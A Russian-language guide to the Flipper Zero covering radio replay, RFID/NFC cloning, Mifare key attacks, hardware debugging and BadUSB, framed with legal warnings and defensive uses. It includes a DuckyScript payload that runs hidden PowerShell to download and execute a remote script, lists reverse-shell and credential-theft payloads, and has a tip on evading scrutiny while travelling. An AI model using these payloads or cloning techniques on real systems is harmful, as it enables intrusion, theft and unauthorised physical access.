**Flipper Zero** — самый известный многофункциональный инструмент в сообществе практической кибербезопасности. Он помещается в карман, стоит около 170 долларов и объединяет радиомодуль Sub-GHz, RFID-считыватель на 125 кГц, антенну NFC, инфракрасный трансивер, порт iButton, Bluetooth-модуль, разъем расширения GPIO и USB-порт в устройстве, которое можно прикрепить к брелоку. В этом руководстве подробно описаны все возможности устройства: от распаковки до продвинутых сценариев работы красной команды.

*Если вы впервые пользуетесь Flipper Zero, читайте разделы по порядку. Если устройство у вас уже есть и вы хотите подробнее изучить определенную подсистему, перейдите прямо к нужному разделу.*

## Обзор аппаратной части

В **Flipper Zero** используется микроконтроллер STM32WB55. Этот двухъядерный чип Arm Cortex-M4 / Cortex-M0+ содержит встроенный Bluetooth 5.0. Основное приложение работает на ядре M4 с частотой до 64 МГц, а ядро M0+ обслуживает стек Bluetooth.

| Компонент | Характеристики |
|-----------|---------|
| **MCU** | STM32WB55RGV6, Cortex-M4 с частотой 64 МГц + Cortex-M0+ |
| **Флеш-память** | 1 МБ встроенной + внешняя SPI NOR на 256 Мбит |
| **ОЗУ** | 256 КБ SRAM |
| **Дисплей** | 1,4-дюймовый экран на электронных чернилах (128x64), постоянно включен |
| **Радио Sub-GHz** | Трансивер CC1101, 300–928 МГц |
| **RFID** | Аналоговый интерфейс на 125 кГц (EM4100, HID, Indala и другие) |
| **NFC** | ST25R3916B, 13,56 МГц, ISO 14443A/B и 15693 |
| **ИК** | Передающий светодиод 940 нм + приемный датчик TSOP75338 |
| **iButton** | Интерфейс 1-Wire, DS1990A и ключи с сенсорной памятью |
| **Bluetooth** | BLE 5.0 (встроен в STM32WB55) |
| **GPIO** | 18-контактный разъем: SPI, I2C, UART, питание 5 В/3,3 В, ADC |
| **USB** | USB-C, поддержка HID-устройств (BadUSB / U2F) |
| **Аккумулятор** | Li-Po на 2000 мА·ч, зарядка через USB-C, около 30 часов обычной работы |
| **MicroSD** | До 128 ГБ, FAT32 или exFAT |

**Экран на электронных чернилах** не расходует энергию, пока показывает неподвижное изображение. Поэтому устройство долго работает от аккумулятора даже в режиме постоянного ожидания.

**CC1101** — универсальный трансивер Sub-GHz компании Texas Instruments, работающий в диапазонах 300–348 МГц, 387–464 МГц и 779–928 МГц. Благодаря программируемости модуль Sub-GHz обладает высокой гибкостью.

## Варианты прошивки

Можно использовать **официальную прошивку Flipper Zero** или один из популярных форков сообщества. Каждый форк открывает функции, которые Flipper Devices ограничивает по нормативным и юридическим причинам.

| Прошивка | Описание | Основные разблокированные функции |
|----------|-------------|-------------|
| **Official** | Стандартная прошивка Flipper Devices | Осторожные и наиболее безопасные настройки |
| **Unleashed** | Самый популярный форк с упором на стабильность | Все частоты Sub-GHz и дополнительные протоколы |
| **Xtreme** | Много функций, активно поддерживается | Настраиваемый интерфейс, дополнительные приложения, разблокировки Sub-GHz |
| **RogueMaster** | Большой набор сторонних приложений | Самый крупный комплект приложений из коробки |

Установите форк, записав его через настольное приложение **qFlipper** для Windows, macOS или Linux, либо скопируйте файл `.dfu` на SD-карту и используйте меню обновления устройства.

*Unleashed — наиболее безопасная отправная точка для исследований. Xtreme выбирают те, кому нужен максимально широкий набор функций. В поездках используйте официальную прошивку, чтобы снизить риск пристального внимания со стороны контролирующих органов.*

## Радиомодуль Sub-GHz

Модуль Sub-GHz привлекает больше всего внимания. Он позволяет записывать, анализировать, повторно передавать и транслировать сигналы в диапазонах, которыми пользуются гаражные ворота, автомобильные брелоки, дверные звонки, беспроводные метеостанции, розетки и сотни других устройств.

### Поддерживаемые диапазоны частот

- **300–348 МГц** — старые пульты и некоторые системы гаражных ворот в США
- **387–464 МГц** — европейские и американские устройства; 433,92 МГц — самая распространенная в мире полоса ISM
- **779–928 МГц** — 868 МГц в Европе, 915 МГц в полосе ISM США и 868 МГц LoRa

### Распространенные схемы модуляции

| Модуляция | Значение |
|------------|---------------|
| **AM (ASK/OOK)** | Амплитудная манипуляция: простой сигнал включения/выключения, который используют многие простые пульты. |
| **FM (FSK/2-FSK)** | Частотная манипуляция: применяется в метеостанциях и некоторых автомобильных брелоках. |
| **APSK** | Комбинированная схема, используемая небольшим числом интеллектуальных устройств. |

Flipper автоматически декодирует необработанные сигналы OOK. Он отображает их на экране и позволяет повторно передать их одним нажатием кнопки. Именно это сделало Flipper Zero известным: **устройства без плавающего кода очень легко атаковать повторной передачей статического кода**.

### Плавающие и статические коды

Устройства со **статическим кодом** каждый раз передают один и тот же сигнал. Flipper Zero записывает его один раз и повторяет по желанию. Статические коды используют почти все недорогие беспроводные розетки, дверные звонки и старые гаражные ворота.

Устройства с **плавающим кодом** (KeeLoq, AUT64 и другие) меняют код после каждого использования. Захваченный сигнал нельзя просто повторить. Атаки на такие системы сложнее: для них требуются специальные инструменты и точная синхронизация на близком расстоянии. Современные плавающие коды Flipper Zero не обходит без дополнительной подготовки.

*Проверяйте устройства, которыми владеете. Устройства со статическим кодом в собственном доме отлично подходят для обучения.*

### Сценарий работы с Sub-GHz

1. Откройте **Sub-GHz** в главном меню.
2. Выберите **Read** (режим чтения и захвата сигнала), чтобы захватить сигнал. Направьте устройство на пульт и нажмите кнопку на нем.
3. Flipper декодирует сигнал и покажет частоту, модуляцию и исходную битовую последовательность.
4. Нажмите **Save** (команда сохранения сигнала), чтобы сохранить сигнал на SD-карту.
5. Нажмите **Send** (команда повторной передачи сигнала) или позднее откройте сохраненный файл, чтобы передать сигнал повторно.

Режим **Frequency Analyzer** (анализатор частот) пассивно сканирует спектр и показывает активные частоты. Он помогает находить неизвестные передатчики.

### Атаки перебором

Для протоколов с небольшим пространством ключей, например старых брелоков со статическим кодом длиной 12 или 24 бита, Flipper может выполнить **перебор**, проверяя все возможные коды. Это работает против очень старых или дешевых устройств, но совершенно неэффективно против плавающих кодов и больших пространств ключей.

В пользовательских прошивках есть дополнительные словари перебора и последовательности атак для отдельных производителей. Часто встречаются последовательности **Came 12bit**, **Nice 12bit**, **Linear 8bit** и **Holtek 12bit**.

## RFID (низкая частота, 125 кГц)

Модуль **RFID на 125 кГц** считывает и записывает низкочастотные карты доступа. Такие карты и брелоки используют старые системы контроля доступа, метки с микрочипами животных и системы промышленного отслеживания.

### Поддерживаемые типы карт

| Тип карты | Примечания |
|-----------|-------|
| **EM4100 / EM4102** | Самые распространенные, только чтение, 64 бита. Используются в недорогих системах доступа по всему миру. |
| **HID Prox** | Популярны в коммерческих системах доступа (HID Global H10301 и варианты). |
| **Indala Prox** | Формат Motorola / Indala для старых систем. |
| **IoProx** | Kantech IoProx, также распространенный в коммерческих зданиях Северной Америки. |
| **FDX-B (ISO 11784/11785)** | Стандарт микрочипов для животных. |
| **Pyramid** | Farpointe Data; аналогичен Indala. |
| **Viking** | Менее распространенный формат в некоторых европейских системах. |

### Чтение карты LF

Поднесите верхний край Flipper, где находится антенна, на несколько сантиметров к карте или брелоку. Откройте меню **125 kHz RFID > Read** (путь для чтения RFID-карты). Пункт Read (читать) считывает карту LF и показывает её ID. Устройство считает ID за одну-две секунды и покажет код объекта и номер карты.

### Эмуляция и клонирование

После чтения карту можно сохранить и позднее **эмулировать**: выберите сохраненный файл и нажмите кнопку. Flipper передаст ID карты, и считыватель воспримет сигнал как исходную карту.

Можно также **записать** ID на чистую перезаписываемую карту T5577. Такие карты стоят недорого (около 0,50 доллара за штуку) и поддерживают большинство низкочастотных форматов.

*Клонирование карт доступа, которыми вы не владеете или которые не уполномочены тестировать, является уголовным преступлением во многих юрисдикциях. Перед тестированием любой системы контроля доступа обязательно получите письменное разрешение.*

### Ограничения низкочастотного RFID

Низкочастотный RFID не имеет криптографической защиты. Любой человек с близко расположенным считывателем может прочитать ID вашей карты. В современных системах физического доступа используют высокочастотные смарт-карты (NFC на 13,56 МГц) с взаимной аутентификацией.

## NFC (высокая частота, 13,56 МГц)

В **модуле NFC** используется чип ST25R3916B с поддержкой ISO 14443A, ISO 14443B и ISO 15693. Эта частота применяется в бесконтактных платежных и транспортных картах, смарт-картах доступа в здания и NFC-метках.

### Поддерживаемые стандарты

| Стандарт | Распространенное применение |
|----------|-----------|
| **ISO 14443A** | Mifare Classic, Mifare DESfire, NXP NTAG, кредитные и дебетовые карты |
| **ISO 14443B** | Некоторые государственные удостоверения и паспорта (внешний слой) |
| **ISO 15693** | Библиотечные метки и некоторые промышленные RFID-системы |
| **EMV (уровень 1)** | Только чтение метаданных бесконтактной платежной карты |
| **NFC-A/B/F/V** (протоколы NFC) | Общий обмен данными по NFC |

### Атаки на Mifare Classic

**Mifare Classic** — стандарт смарт-карт на 13,56 МГц, теоретически взломанный в 2008 году. Его до сих пор используют многие старые транспортные системы и системы доступа в здания. Flipper Zero выполняет несколько видов атак:

- **Read** (читать) — считывает все сектора, где используется заводской ключ (`FFFFFFFFFFFF` или `A0A1A2A3A4A5`).
- **Атака по словарю** — проверяет список распространенных ключей для закрытых секторов. В пользовательские прошивки входят большие словари ключей.
- **Nested-атака** — требует знать ключ хотя бы одного сектора. С помощью криптоанализа на основе времени вычисляет ключи других секторов.
- **Атака Darkside** — в некоторых версиях Mifare Classic работает даже без известных ключей. Flipper нужно расположить не дальше сантиметра от карты.

После считывания всех секторов сохраните полный дамп и **эмулируйте** карту. Flipper воспроизведет ее так, будто это исходная карта, включая данные секторов.

*Не клонируйте карты Mifare Classic с действующим балансом, например транспортными поездками или парковочными кредитами, если вы не владеете и картой, и серверной системой.*

### Mifare DESfire и современные карты

В картах **Mifare DESfire EV1/EV2/EV3** используются шифрование AES-128 и взаимная аутентификация. Flipper Zero не считывает защищенные данные. Он может прочитать UID карты и список AID, но без правильных ключей не получает данные приложений. Это предусмотрено конструкцией: DESfire обеспечивает надежную защиту.

**Платежные карты EMV** — бесконтактные Visa, Mastercard и Amex — позволяют читать общедоступные метаданные: номер старой карты, срок действия и историю транзакций. Современные карты сократили объем данных, возвращаемых при публичном чтении. Flipper не может инициировать или перехватывать реальные платежные операции.

### NFC-метки и NDEF

**NDEF (NFC Data Exchange Format)** — стандартный формат NFC-меток для маркетинга, подтверждения подлинности товаров и смарт-этикеток. Flipper умеет читать, сохранять, записывать и эмулировать метки NDEF. Это полезно для:

- Клонирования меток NXP NTAG203 или NTAG213 при тестировании
- Записи собственных данных NDEF (URL-адресов, контактных карточек, учетных данных Wi-Fi)
- Эмуляции метки для запуска действия на телефоне без физической метки

## Инфракрасный порт (IR)

Инфракрасный модуль состоит из передающего светодиода на 940 нм и приемного демодулятора TSOP75338. Он поддерживает практически все протоколы бытовых ИК-пультов.

### Поддерживаемые протоколы с декодированием

| Протокол | Распространенные устройства |
|----------|---------------|
| **NEC** | Самый распространенный; используется LG, Samsung, Panasonic и многими другими |
| **RC5** | Устройства Philips |
| **RC6** | Philips, Microsoft, приставки кабельного телевидения |
| **Samsung32** | Телевизоры и домашние кинотеатры Samsung |
| **NECext** | Расширенный NEC с 32-битными адресами |
| **SIRC12 / SIRC15 / SIRC20** | Устройства Sony |
| **Kaseikyo** | Panasonic, JVC |
| **RCA** | Пульты бренда RCA |

Flipper также записывает и воспроизводит **необработанные ИК-сигналы**, если не может декодировать их протокол. Такая запись сохраняет точную длительность импульсов и пауз и воспроизводит сигнал с полной точностью.

### Универсальный пульт

Встроенное приложение **Universal Remotes** позволяет просматривать базу ИК-кодов по брендам и типам устройств. Можно выключать телевизоры, менять громкость саундбаров и управлять кондиционерами без физического пульта. В библиотеке ИК-кодов GitHub, которую поддерживает сообщество (`flipperzero-ir-relay`), есть еще тысячи кодов.

*Во время операции красной команды или социальной инженерии универсальный ИК-пульт помогает отвлечь внимание в помещениях с видимыми экранами.*

### Запись собственного пульта

1. Откройте **Infrared > Learn New Remote** (инфракрасный порт > обучение новому пульту).
2. Направьте исходный пульт на окно ИК-приемника Flipper на верхнем крае.
3. Нажмите каждую нужную кнопку. Flipper сохранит каждую отдельно.
4. Назовите файл пульта и сохраните его.
5. Повторно передайте любую кнопку из сохраненного файла.

## iButton и 1-Wire

**iButton** (Dallas/Maxim 1-Wire) — контактный протокол, который используют некоторые системы физического доступа, отслеживания активов и измерения температуры. Контакт iButton — небольшой металлический диск или цилиндр, который прикладывают к считывателю.

### Поддерживаемые типы ключей

| Тип ключа | Примечания |
|----------|-------|
| **DS1990A** | Самый распространенный ключ доступа; уникальный 64-битный ID, только чтение |
| **DS1992** | Ключ памяти с 1 КБ NVRAM |
| **DS1996** | Ключ памяти с 64 КБ NVRAM |
| **Cyfral** | Формат систем доступа Восточной Европы |
| **Metacom** | Менее распространенный формат домофонной связи |

Чтобы прочитать ключ, коснитесь порта iButton Flipper (золотистые контакты на нижнем крае) ключа. Сохраните и эмулируйте его по тому же сценарию, что и RFID/NFC. Flipper также может записывать ID на чистые перезаписываемые ключи iButton RW1990.

## GPIO и взлом аппаратуры

**18-контактный разъем GPIO** в верхней части Flipper Zero — основной интерфейс для взлома аппаратуры. Он предоставляет SPI, I2C, UART, ADC и линии питания.

### Распиновка GPIO

| Контакт | Функция |
|-----|---------|

### Доступ к консоли UART

Многие встроенные устройства оставляют консоль отладки UART включенной и в серийной версии. Подключив контакты UART Flipper к UART TX/RX целевого устройства, можно работать с последовательной консолью и, возможно:

- Получить привилегированную оболочку
- Найти учетные данные и сведения о системе в журнале загрузки
- Записать неподписанную прошивку, если доступно меню загрузчика

Откройте **GPIO > USB-UART Bridge** (меню GPIO для подключения моста USB–UART) или используйте приложение GPIO, чтобы запустить терминальное подключение. На подключенном компьютере Flipper появится как последовательный USB-порт и соединит его с контактами UART.

### Датчики SPI и I2C

Подключите к разъему GPIO любой датчик SPI или I2C, например акселерометр, датчик барометрического давления, датчик температуры и влажности или OLED-дисплей. Для многих распространенных микросхем есть приложения сообщества:

- **SSD1306** — драйвер OLED-дисплея
- **BME280** — температура, влажность и давление
- **NRF24L01** — радиомодуль 2,4 ГГц, расширяющий поверхность беспроводной атаки
- **CC1101** — внешняя антенна для увеличения дальности Sub-GHz

### Отладка JTAG и SWD

На некоторых контактах GPIO Flipper доступны сигналы SWD. С адаптером Flipper можно использовать как **отладочный адаптер JTAG/SWD**, чтобы:

- Останавливать и пошагово выполнять код на целевом микроконтроллере
- Читать и записывать флеш-память
- Извлекать прошивку с заблокированных устройств: вызвать сбой напряжения, а затем получить доступ через отладчик

Это продвинутый сценарий. Перенос прошивки **BlackMagic Probe** на Flipper делает такой процесс практичным.

## BadUSB и атаки USB HID

При подключении к компьютеру через USB-C Flipper Zero определяется как **USB-клавиатура HID**. Это вектор атаки BadUSB: устройство автоматически вводит нажатия клавиш без установки драйверов.

### DuckyScript

В скриптах BadUSB для Flipper используется **DuckyScript**, тот же язык сценариев, что и в USB Rubber Ducky от Hak5. Скрипт — обычный текстовый файл в папке `badusb/` на SD-карте.

```
REM Открыть окно «Выполнить» и запустить PowerShell
DELAY 500
GUI r
DELAY 300
STRING powershell -NoP -W Hidden -Exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')"
ENTER
```

Распространенные полезные нагрузки BadUSB:

- **Обратная оболочка** — открывает сетевое подключение к компьютеру атакующего
- **Сбор учетных данных** — запускает Mimikatz или аналогичные инструменты в памяти
- **Закрепление в системе** — добавляет запись автозапуска или запланированную задачу
- **Извлечение паролей Wi-Fi** — использует `netsh` для экспорта сохраненных беспроводных профилей
- **Внедрение ключа SSH** — добавляет ключ атакующего в `authorized_keys`

### Защита от BadUSB

Атака BadUSB работает, потому что компьютеры безусловно доверяют клавиатурам. Меры защиты включают:

- **USBGuard** (Linux) — разрешение конкретных USB-устройств по идентификаторам производителя и продукта
- **Групповая политика блокировки USB** (Windows) — отключение HID-устройств производителей, не включенных в список разрешенных
- **Физические блокираторы портов** — предотвращают подключение USB в защищенных помещениях
- **Обнаружение на конечных точках** — решения вроде CrowdStrike эвристически обнаруживают быструю инъекцию нажатий клавиш

### Аппаратный ключ U2F

Flipper Zero также может работать как **аппаратный ключ безопасности FIDO U2F**. В официальной прошивке есть поддержка U2F. Зарегистрируйте Flipper на любом сайте с поддержкой FIDO U2F (GitHub, Google, Cloudflare и других), затем нажмите заднюю кнопку Flipper для подтверждения входа.

Так Flipper становится аппаратным токеном для ваших учетных записей. Материал закрытого ключа хранится в защищенной памяти микроконтроллера.

## Bluetooth

В STM32WB55 встроен Bluetooth 5.0. Flipper использует BLE для:

- **Flipper Mobile App** — приложения для iOS и Android для управления файлами, обновления прошивки и удаленного управления
- **BadBT** (приложение сообщества) — вводит нажатия DuckyScript по Bluetooth, а не через USB, позволяя выполнять беспроводную HID-инъекцию на сопряженных Bluetooth-компьютерах
- **Сканер BLE** — пассивно сканирует объявления BLE поблизости; полезен для инвентаризации IoT-устройств в здании

Дальность Bluetooth невелика, примерно 10–30 метров на открытом пространстве. Этого достаточно, чтобы передать BadUSB по беспроводной связи из сумки или кармана, находясь рядом с целевой рабочей станцией.

### Сопряжение с мобильным приложением

1. Загрузите **Flipper Mobile App** из App Store или Google Play.
2. На Flipper откройте **Settings > Bluetooth > Pair Phone** (меню для сопряжения телефона по Bluetooth).
3. Запустите приложение и следуйте инструкциям по сопряжению.
4. Используйте приложение для просмотра SD-карты, установки приложений из каталога и передачи данных с датчиков.

## Подробно о пользовательских прошивках

### Прошивка Unleashed

**Unleashed** (доступна по адресу `github.com/DarkFlippers/unleashed-firmware`) — наиболее консервативный форк сообщества. Он снимает географические ограничения частот Sub-GHz и добавляет поддержку дополнительных протоколов, оставаясь близким к официальной базе кода. Приоритет — стабильность.

Основные дополнения относительно официальной прошивки:

- Расширенный диапазон Sub-GHz (300–928 МГц без ограничений)
- Дополнительные протоколы Sub-GHz (CAME, Nice, DoorHan и другие)
- Дополнительные протоколы NFC
- Расширенная поддержка DuckyScript в BadUSB
- Более крупная база кодов IR

### Прошивка Xtreme

**Xtreme** (доступна по адресу `github.com/Flipper-XFW/Xtreme-Firmware`) добавляет полноценную систему пользовательских ресурсов поверх функций Unleashed. Можно менять имя Flipper, заставку, анимацию рабочего стола и поведение светодиода. Меню Settings заметно расширено.

Дополнительные функции:

- App Hub с подобранными сторонними приложениями
- Расширенные полезные нагрузки атак Sub-GHz и NFC
- Сценарии управления RGB-светодиодами
- Улучшения управления файлами

### RogueMaster

**RogueMaster** включает самую большую коллекцию сторонних приложений и инструментов сообщества, в том числе экспериментальных и потенциально рискованных в отдельных ситуациях. Он менее стабилен, чем Unleashed или Xtreme, зато содержит больше всего инструментов в одной установке.

### Установка любой прошивки

```bash
# Через CLI qFlipper
qFlipper cli -c firmware /path/to/firmware.dfu

# Либо поместите firmware.zip в корень SD-карты, затем откройте:
# Settings > Firmware Update > Update from SD Card (Настройки > Обновление прошивки > Обновить с SD-карты)
```

*Перед обновлением прошивки всегда копируйте содержимое SD-карты в резервную копию. Процесс обновления карту не стирает, но резервное копирование остается хорошей практикой.*

## Аксессуары и аппаратные расширения

### WiFi Dev Board

**WiFi Dev Board** напрямую подключается к разъему GPIO Flipper. На ней установлен ESP32-S2 с прошивкой **WiFi Marauder**, которая добавляет поддержку 802.11 b/g/n:

- **Сканирование SSID** — обнаружение всех ближайших точек доступа
- **Спам маяками** — передача десятков фиктивных SSID, чтобы запутать клиентов и создать заметные помехи
- **Атака деаутентификации** — передача кадров деаутентификации 802.11 для отключения клиентов от точки доступа
- **Перехват probe-запросов** — захват запросов для определения устройств и запомненных ими SSID
- **Атака WPS** — поиск маршрутизаторов с включенным WPS и попытка перебора PIN-кода (медленно)
- **Захват PMKID** — получение хешей PMKID для офлайн-подбора без клиента

Управление WiFi Dev Board выполняется с помощью экрана и кнопок Flipper. Телефон или компьютер не нужны.

*Передача кадров деаутентификации против чужих сетей незаконна в США по закону Computer Fraud and Abuse Act (CFAA) и аналогичным законам большинства стран. Используйте эту возможность только в авторизованной лаборатории.*

### Модуль видеоигр

**Video Game Module** содержит RP2040 и небольшой аккумулятор. Он подключается к разъему GPIO и добавляет беспроводные многопользовательские игры. Модуль также может работать как автономный микроконтроллер для пользовательского кода, перенося часть вычислений с основного STM32.

### Модуль ESP32 WROOM (DIY)

Обычный **ESP32-WROOM-32**, подключенный к GPIO Flipper через UART или SPI, еще больше расширяет поверхность атаки:

- Полноценный Wi-Fi 802.11 с пользовательской прошивкой
- Одновременная работа Bluetooth Classic 2,4 ГГц и BLE вместе с собственным BLE Flipper
- Внешнее расширение GPIO
- Веб-сервер для удаленного управления во время физических операций

### Адаптер для контактов Raspberry Pi Zero 2W

Разработанные сообществом адаптеры подключают **Raspberry Pi Zero 2W** к разъему GPIO Flipper. Pi запускает полноценную среду Linux и взаимодействует с Flipper через UART или последовательный USB. Это используют для:

- Длительной регистрации данных
- Запуска Bettercap или Kismet для разведки сети
- Работы в качестве ретранслятора C2 во время операций красной команды
- Хранения больших захватов, не помещающихся на microSD

## Сценарии тестирования на проникновение

### Сценарий обхода физического доступа

1. С помощью **RFID-считывателя на 125 кГц** незаметно считайте пропуска сотрудников в вестибюле.
2. Клонируйте пропуск на чистую карту T5577 или эмулируйте его непосредственно с Flipper.
3. Используйте клонированный пропуск для доступа в защищенные зоны.
4. Зафиксируйте, какие считыватели приняли скопированные учетные данные, и сообщите об этом клиенту.

Тест показывает, использует ли объект EM4100 (небезопасный и клонируемый) или современные смарт-карты NFC (их сложнее клонировать).

### Инвентаризация беспроводных устройств

1. Пройдите по объекту с включенным **Sub-GHz Frequency Analyzer** (анализатор частот Sub-GHz).
2. Запишите все активные частоты и типы сигналов.
3. Используйте режим **Read** (режим чтения и захвата сигнала), чтобы захватывать и определять сигналы устройств вроде беспроводных датчиков сигнализации, парковочных барьеров и контроллеров HVAC.
4. Отнесите устройства со статическим кодом к находкам высокой критичности.

### Обследование RFID

1. Включите режим **NFC > Detect Reader**, чтобы Flipper имитировал карту и обнаруживал считыватели поблизости без переноски учетных данных.
2. Определите типы считывателей (Mifare Classic, DESfire, ISO 15693) и оцените уровень защиты каждой точки доступа.

### Имитация атаки BadUSB с оставленным устройством

1. Заранее загрузите полезную нагрузку DuckyScript на SD-карту Flipper.
2. Оставьте Flipper подключенным к разблокированной рабочей станции. Для этого нужен физический доступ.
3. Скрипт выполняется автоматически: инвентаризирует компьютер, похищает учетные данные и устанавливает обратное соединение.
4. Зафиксируйте время до запуска и показатели обнаружения.

Этот тест проверяет политики контроля USB-устройств организации и охват средств обнаружения на конечных точках.

### Проверка беспроводных датчиков сигнализации

Многие беспроводные датчики дверей и окон передают простые сигналы OOK в диапазоне Sub-GHz. Если они используют статические коды:

1. **Запишите** сигнал датчика, сработавшего при открытии окна в авторизованной тестовой среде.
2. **Повторите передачу** сигнала, чтобы смоделировать срабатывание датчика без физического открытия окна.
3. Проверьте, подает ли система сигнализации тревогу.

Это показывает, сможет ли злоумышленник обойти беспроводные периметральные датчики с помощью устройства за 170 долларов.

## Применение на CTF и соревнованиях

Flipper Zero встречается в соревнованиях **Capture The Flag** в категориях физической безопасности. Типичные задачи:

- Клонировать пропуск и открыть запертый ящик с флагом
- Повторно передать сигнал Sub-GHz и открыть имитацию двери
- Декодировать ИК-сигнал и восстановить скрытое сообщение
- Эмулировать NFC-метку и пройти аутентификацию как другой пользователь
- Использовать BadUSB для выполнения полезной нагрузки на компьютере с оператором

Встроенный журнал Flipper и емкость SD-карты позволяют архивировать каждый сигнал, собранный на CTF, для последующего анализа.

## Защитные сценарии

Команды безопасности используют Flipper Zero для аудита собственных сред:

- **Аудит карт** — считывают карты доступа, чтобы найти системы EM4100 или Mifare Classic, которые следует обновить до DESfire EV2 или новее.
- **Аудит беспроводных устройств** — находят все устройства Sub-GHz и отмечают системы со статическими кодами.
- **Проверка политик BadUSB** — проверяют работу политик блокировки устройств USB HID.
- **Аудит ИК-пультов** — убеждаются, что чувствительным оборудованием нельзя управлять универсальным ИК-пультом.
- **Проверка возможности клонирования NFC-меток** — определяют, можно ли клонировать NFC-метки на товарах или учетных данных.

## Правовые и этические аспекты

Flipper Zero — законный инструмент исследований безопасности. Его можно использовать и во вред. Юридические риски зависят от юрисдикции и обстоятельств.

### Что обычно законно при наличии разрешения

- Тестирование устройств, которыми вы владеете
- Авторизованное тестирование на проникновение по подписанному техническому заданию
- Исследования безопасности в контролируемой лабораторной среде
- Чтение собственных карт доступа и пультов
- Участие в официально разрешенных CTF-соревнованиях

### Что обычно незаконно

- Повторная передача сигнала чужой гаражной двери для проникновения
- Клонирование карты, которая дает доступ в здание, куда вам не разрешен вход
- Передача кадров деаутентификации против сети, которую вы не контролируете
- Использование BadUSB на компьютере без письменного разрешения
- Перехват частных сообщений (Sub-GHz или других) в большинстве юрисдикций

В **США** к применимым законам относятся Computer Fraud and Abuse Act (CFAA), Electronic Communications Privacy Act (ECPA) и правила Federal Communications Commission (FCC) о передаче радиосигналов. В **ЕС** аналогичные ограничения устанавливают национальные законы о компьютерных преступлениях и Директива о радиооборудовании.

*FCC не запрещает владеть или пользоваться устройством, способным принимать сигналы Sub-GHz. Передача без лицензии на некоторых частотах запрещена. Большинство бытовых устройств Sub-GHz работает в нелицензируемых полосах ISM (315 МГц, 433 МГц, 915 МГц), а их низкая мощность обычно укладывается в ограничения Part 15.*

В 2024 году Канада пыталась ограничить импорт Flipper Zero из-за опасений по поводу угона автомобилей. Это было преимущественно политической реакцией на сообщения СМИ об атаках с ретрансляцией сигналов автомобильных ключей, а не технически точным выводом: в современных системах бесключевого доступа используются плавающие коды, которые Flipper не может обойти без дополнительного оборудования.

## Настройка среды разработки

### Сборка официальной прошивки

```bash
git clone --recursive https://github.com/flipperdevices/flipperzero-firmware.git
cd flipperzero-firmware

# Установка набора инструментов (Linux/macOS)
./fbt

# Сборка прошивки
./fbt fap_dist

# Прошивка через USB
./fbt flash_usb_full
```

**FBT (Flipper Build Tool)** автоматически устанавливает набор инструментов, загружает зависимости и управляет сборкой. Понадобятся Python 3.8+ и кросс-компилятор ARM GCC.

### Создание собственного приложения

Приложения используют формат **Flipper Application Package (FAP)**. Каждое приложение находится в каталоге `applications_user/` или `applications/`.

```c
#include <furi.h>
#include <gui/gui.h>

static void my_app_draw_callback(Canvas* canvas, void* ctx) {
// Минимальная структура FAP; штатный шрифт поддерживает только ASCII, поэтому приветствие оставлено на английском.
    canvas_draw_str(canvas, 10, 32, "Hello, Flipper!");
}

int32_t my_app_main(void* p) {
    UNUSED(p);
    ViewPort* view_port = view_port_alloc();
    view_port_draw_callback_set(view_port, my_app_draw_callback, NULL);

    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    furi_delay_ms(3000);

    gui_remove_view_port(gui, view_port);
    view_port_free(view_port);
    furi_record_close(RECORD_GUI);
    return 0;
}
```

Приложения взаимодействуют с оборудованием Flipper через API **Furi** (Flipper Universal Registry Implementation). Доступ к подсистемам основан на записях: откройте запись по имени, получите указатель на подсистему, используйте ее и закройте запись.

### Структура папок SD-карты

Flipper ожидает на SD-карте определенные каталоги:

| Каталог | Содержимое |
|-----------|---------|
| `subghz/` | Сохраненные захваты Sub-GHz (файлы .sub) |
| `nfc/` | Сохраненные дампы NFC (файлы .nfc) |
| `lfrfid/` | Сохраненные ключи RFID LF (файлы .rfid) |
| `infrared/` | Сохраненные ИК-пульты (файлы .ir) |
| `ibutton/` | Сохраненные ключи iButton (файлы .ibtn) |
| `badusb/` | Полезные нагрузки DuckyScript (файлы .txt) |
| `apps/` | Сторонние приложения FAP |
| `music_player/` | Музыкальные файлы .fmf |
| `dolphin/` | Сохраненные данные опыта Dolphin |

## Сравнение Flipper Zero с альтернативами

| Устройство | Цена | Sub-GHz | NFC/RFID | IR | GPIO | Примечания |
|--------|-------|---------|----------|----|------|-------|
| **Flipper Zero** | ~$170 | Да (CC1101) | Да (полная поддержка) | Да | Да | Самый универсальный вариант |
| **HackRF One** (радио с программной настройкой) | ~$350 | Да (SDR) | Нет | Нет | Ограниченно | Полноценный SDR с гораздо более широким диапазоном, без встроенного NFC |
| **RTL-SDR** | ~$25 | Только прием | Нет | Нет | Нет | Самый дешевый SDR для анализа сигналов только на прием |
| **Proxmark3** | ~$300 | Нет | Да (расширенная поддержка) | Нет | Ограниченно | Лучше анализирует RFID/NFC, уступает в остальном |
| **USB Rubber Ducky** | ~$60 | Нет | Нет | Нет | Нет | Только BadUSB, без беспроводной связи |
| **ChameleonMini** | ~$80 | Нет | Да | Нет | Ограниченно | Специализированный эмулятор NFC/RFID |
| **WiFi Pineapple** | ~$100 | Только WiFi | Нет | Нет | Нет | Платформа для атак 802.11 |

Сильная сторона Flipper Zero — широта возможностей, а не глубина в отдельной категории. Для углубленной работы с RFID/NFC лучше подходит Proxmark3. Для полноценного SDR HackRF или USRP значительно мощнее. Для атак 802.11 лучше выбрать WiFi Pineapple. Flipper Zero удобно брать с собой, когда заранее неизвестно, с чем придется столкнуться.
